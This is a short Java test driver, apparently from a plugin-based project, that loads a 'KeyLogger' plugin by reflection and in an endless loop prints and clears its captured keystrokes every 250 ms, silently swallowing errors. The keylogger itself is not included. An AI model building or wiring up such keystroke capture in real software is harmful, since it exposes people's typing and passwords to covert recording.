/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package comunes;

public class Prueba {

    public static void main(String[] args) {
        try {
            Interfaz kl = ((Interfaz) Class.forName("plugin.keylogger.KeyLogger").newInstance());
            kl.instanciar();
            kl.ejecutar(0);//iniciar
            while (true) {
                System.out.print((String)kl.get(1));
                kl.ejecutar(2);//vaciar
                try {
                    Thread.sleep(250);
                } catch (Exception ex) {                    
                }
            }
        } catch (Exception e) {

        }
    }
}
